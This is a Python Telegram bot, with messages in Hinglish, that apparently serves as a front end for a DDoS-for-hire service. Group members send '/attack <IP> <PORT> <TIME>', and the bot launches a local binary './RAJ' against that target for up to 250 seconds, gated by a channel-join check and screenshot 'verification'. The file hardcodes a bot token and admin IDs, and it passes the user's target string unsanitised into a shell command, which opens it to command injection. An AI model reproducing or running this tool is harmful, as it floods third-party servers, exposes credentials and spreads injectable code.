import telebot
import datetime
import time
import subprocess
import threading

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7877458054:AAFaaZKMud2u-95QdEjA6ws82GBe7gx3SLA')

# ✅ GROUP & CHANNEL SETTINGS
GROUP_ID = "-1002535125255"
SCREENSHOT_CHANNEL = "@neoblade123"
ADMINS = [7769457936 , 5962383405]

# ✅ GLOBAL VARIABLES
active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
pending_verification = {}  # वेरिफिकेशन के लिए यूजर्स लिस्ट
user_attack_count = {}
MAX_ATTACKS = 2  # (या जो भी लिमिट चाहिए)

# ✅ CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ✅ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 NEO KE GROUP  𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑 𝐎𝐑 𝐔𝐒𝐄 𝐊𝐀𝐑!!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝐏𝐄𝐇𝐋𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑𝐎!!** {SCREENSHOT_CHANNEL}")
        return

    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
    if user_id in pending_verification:
        bot.reply_to(message, "🚫 **𝐏𝐄𝐇𝐋𝐄 𝐏𝐔𝐑𝐀𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐊𝐀 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉, 𝐓𝐀𝐁𝐇𝐈 𝐍𝐀𝐘𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐄𝐆𝐀!**")
        return

    # ✅ अटैक लिमिट चेक करो
    user_active_attacks = sum(1 for uid in active_attacks.keys() if uid == user_id)
    if user_active_attacks >= MAX_ATTACKS:
        bot.reply_to(message, f"⚠️ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 ({MAX_ATTACKS}) 𝐏𝐎𝐎𝐑𝐈 𝐇𝐎 𝐂𝐇𝐔𝐊𝐈 𝐇𝐀𝐈!**\n👉**𝐏𝐄𝐇𝐋𝐄 𝐏𝐔𝐑𝐀𝐍𝐄 𝐊𝐇𝐀𝐓𝐀𝐌 𝐇𝐎𝐍𝐄 𝐃𝐎! /check 𝐊𝐀𝐑𝐎!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE:** `/attack <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐔𝐑 𝐓𝐈𝐌𝐄 𝐍𝐔𝐌𝐁𝐄𝐑 𝐇𝐎𝐍𝐄 𝐂𝐇𝐀𝐇𝐈𝐘𝐄!**")
        return

    if time_duration > 250:
        bot.reply_to(message, "🚫 **250𝐒 𝐒𝐄 𝐙𝐘𝐀𝐃𝐀 𝐀𝐋𝐋𝐎𝐖𝐄𝐃 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")
        return

    # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
    pending_verification[user_id] = True

    bot.send_message(
        message.chat.id,
        f"📸 **𝐓𝐔𝐑𝐀𝐍𝐓 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉!**\n"
        f"⚠️ **𝐀𝐆𝐀𝐑 𝐍𝐀𝐇𝐈 𝐃𝐈𝐘𝐀 𝐓𝐎 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐋𝐎𝐂𝐊 𝐇𝐎 𝐉𝐀𝐘𝐄𝐆𝐀!",
        parse_mode="Markdown"
    )

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"🔥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐄𝐓𝐀𝐈𝐋𝐒** 🔥\n\n"
        f"👤 **𝐔𝐒𝐄𝐑:** `{user_id}`\n"
        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target}`\n"
        f"📍 **𝐏𝐎𝐑𝐓:** `{port}`\n"
        f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** `{time_duration} 𝐒𝐄𝐂𝐎𝐍𝐃𝐒`\n"
        f"🕒 **𝐒𝐓𝐀𝐑𝐓 𝐓𝐈𝐌𝐄:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"🚀 **𝐄𝐍𝐃 𝐓𝐈𝐌𝐄:** `{end_time.strftime('%H:%M:%S')}`\n"
        f"📸 **𝐍𝐎𝐓𝐄:** **𝐓𝐔𝐑𝐀𝐍𝐓 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉𝐎, 𝐖𝐀𝐑𝐍𝐀 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐋𝐎𝐂𝐊 𝐇𝐎 𝐉𝐀𝐘𝐄𝐆𝐀!**\n\n"
        f"⚠️ **𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟𝗨 𝗛𝗔! /check 𝐊𝐀𝐑𝐊𝐄 𝐒𝐓𝐀𝐓𝐔𝐒 𝐃𝐄𝐊𝐇𝐎!**",
        parse_mode="Markdown"
    )

    # ✅ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./RAJ {target} {port} {time_duration}", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐀𝐈𝐋 𝐇𝐎 𝐆𝐀𝐘𝐀!**")
        finally:
            bot.send_message(
                message.chat.id,
                "✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐊𝐇𝐀𝐓𝐀𝐌 𝐇𝐎 𝐆𝐀𝐘𝐀!** 🎯",
                parse_mode="Markdown"
            )
            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर

    threading.Thread(target=attack_execution).start()

# ✅ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in pending_verification:
        bot.reply_to(message, "❌ **𝐓𝐄𝐑𝐄 𝐊𝐎𝐈 𝐏𝐄𝐍𝐃𝐈𝐍𝐆 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈! 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐅𝐀𝐋𝐓𝐔 𝐍𝐀 𝐁𝐇𝐄𝐉!**")
        return

    # ✅ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐅𝐑𝐎𝐌:** `{user_id}`")

    del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
    bot.reply_to(message, "✅ **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐕𝐄𝐑𝐈𝐅𝐘 𝐇𝐎 𝐆𝐀𝐘𝐀! 𝐀𝐁 𝐓𝐔 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐊𝐀𝐑 𝐒𝐀𝐊𝐓𝐀 𝐇𝐀𝐈!**")

# ✅ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        if active_attacks[user][2] <= now:
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "📊 **𝐅𝐈𝐋𝐇𝐀𝐀𝐋 𝐊𝐎𝐈 𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐍𝐀𝐇𝐈 𝐂𝐇𝐀𝐋 𝐑𝐀𝐇𝐀!** ❌")
        return

    stats_message = "📊 **𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:**\n\n"
    for user, (target, port, end_time) in active_attacks.items():
        remaining_time = (end_time - now).total_seconds()
        stats_message += (
            f"👤 **𝐔𝐒𝐄𝐑 𝐈𝐃:** `{user}`\n"
            f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target}`\n"
            f"📍 **𝐏𝐎𝐑𝐓:** `{port}`\n"
            f"⏳ **𝐄𝐍𝐃𝐒 𝐈𝐍:** `{int(remaining_time)}s`\n"
            f"🕒 **𝐄𝐍𝐃 𝐓𝐈𝐌𝐄:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗛𝗢 𝗥𝗔𝗛𝗔 𝗛𝗔𝗜...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 𝗦𝗜𝗥𝗙 𝗔𝗗𝗠𝗜𝗡 𝗛𝗜 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗞𝗔𝗥 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜!")

# ✅ START POLLING
bot.polling(none_stop=True)